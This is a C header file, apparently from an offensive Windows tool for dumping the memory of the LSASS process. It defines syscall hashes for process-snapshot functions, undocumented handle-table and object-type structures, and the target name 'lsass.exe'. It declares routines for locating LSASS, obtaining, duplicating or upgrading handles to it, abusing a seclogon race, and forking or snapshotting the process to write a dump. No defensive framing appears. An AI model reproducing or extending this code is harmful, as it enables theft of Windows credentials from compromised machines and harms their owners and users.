#pragma once

#if defined(NANO) && !defined(SSP)

#include <windows.h>
#include <winternl.h>

#include "utils.h"
#include "dinvoke.h"

typedef DWORD(WINAPI* PssNtCaptureSnapshot_t) (PHANDLE SnapshotHandle, HANDLE ProcessHandle, DWORD CaptureFlags, DWORD ThreadContextFlags);
typedef DWORD(WINAPI* PssNtQuerySnapshot_t) (HANDLE SnapshotHandle, DWORD InformationClass, PVOID Buffer, DWORD BufferLength);
typedef DWORD(WINAPI* PssNtFreeSnapshot_t) (HANDLE SnapshotHandle);

#define PssNtCaptureSnapshot_SW2_HASH 0xE54FFDDB
#define PssNtQuerySnapshot_SW2_HASH 0x568E92DE
#define PssNtFreeSnapshot_SW2_HASH 0x248F0BD4

#define LSASS_EXE L"lsass.exe"
#define PROCESS_HANDLE_TYPE L"Process"
#define TOKEN_HANDLE_TYPE L"Token"

#define MAX_PROCESSES 5000

#define RtlOffsetToPointer(B,O)  ((PCHAR)( ((PCHAR)(B)) + ((ULONG_PTR)(O))  ))

#ifndef ALIGN_UP_TYPE
#define ALIGN_UP_TYPE(Address, Align) (((ULONG_PTR)(Address) + (Align) - 1) & ~((Align) - 1))
#endif

#ifndef ALIGN_UP
#define ALIGN_UP(Address, Type) ALIGN_UP_TYPE(Address, sizeof(Type))
#endif

#define ObjectTypesInformation 3

#define OBJECT_TYPES_FIRST_ENTRY(ObjectTypes) (POBJECT_TYPE_INFORMATION)\
    RtlOffsetToPointer(ObjectTypes, ALIGN_UP(sizeof(OBJECT_TYPES_INFORMATION), ULONG_PTR))

#define OBJECT_TYPES_NEXT_ENTRY(ObjectType) (POBJECT_TYPE_INFORMATION)\
    RtlOffsetToPointer(ObjectType, sizeof(OBJECT_TYPE_INFORMATION) + \
    ALIGN_UP(ObjectType->TypeName.MaximumLength, ULONG_PTR))

typedef struct _OBJECT_TYPES_INFORMATION {
    ULONG NumberOfTypes;
} OBJECT_TYPES_INFORMATION, * POBJECT_TYPES_INFORMATION;

typedef struct _OBJECT_TYPE_INFORMATION_V2 {
    UNICODE_STRING TypeName;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    UCHAR TypeIndex;
    CHAR ReservedByte;
    ULONG PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION_V2, * POBJECT_TYPE_INFORMATION_V2;

#if defined(_MSC_VER)

typedef enum _POOL_TYPE
{
    NonPagedPool,
    PagedPool,
    NonPagedPoolMustSucceed,
    DontUseThisType,
    NonPagedPoolCacheAligned,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS
} POOL_TYPE, *PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION
{
    UNICODE_STRING Name;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccess;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    USHORT MaintainTypeList;
    POOL_TYPE PoolType;
    ULONG PagedPoolUsage;
    ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

typedef struct _SYSTEM_HANDLE
{
    ULONG ProcessId;
    BYTE ObjectTypeNumber;
    BYTE Flags;
    USHORT Handle;
    PVOID Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG Count;
    SYSTEM_HANDLE Handle[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

#endif

typedef struct _PROCESS_LIST
{
    ULONG Count;
    ULONG ProcessId[MAX_PROCESSES];
} PROCESS_LIST, *PPROCESS_LIST;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

HANDLE make_handle_full_access(
    IN HANDLE hProcess);

HANDLE obtain_lsass_handle(
    IN DWORD lsass_pid,
    IN DWORD permissions,
    IN BOOL dup,
    IN BOOL seclogon_race,
    IN BOOL is_malseclogon_stage_2,
    IN LPCSTR dump_path);

HANDLE find_lsass(
    IN DWORD dwFlags);

HANDLE get_process_handle(
    IN DWORD dwPid,
    IN DWORD dwFlags,
    IN BOOL quiet);

PSYSTEM_HANDLE_INFORMATION get_all_handles(VOID);

BOOL process_is_included(
    IN PPROCESS_LIST process_list,
    IN ULONG ProcessId);

PPROCESS_LIST get_processes_from_handle_table(
    IN PSYSTEM_HANDLE_INFORMATION handleTableInformation);

POBJECT_TYPES_INFORMATION QueryObjectTypesInfo(VOID);

BOOL GetTypeIndexByName(
    IN LPWSTR handle_type,
    OUT PULONG ProcesTypeIndex);

HANDLE duplicate_lsass_handle(
    IN DWORD lsass_pid,
    IN DWORD permissions);

HANDLE fork_process(
    IN HANDLE hProcess);

HANDLE snapshot_process(
    IN HANDLE hProcess,
    OUT PHANDLE hSnapshot);

BOOL free_snapshot(
    IN HANDLE hSnapshot);

#endif
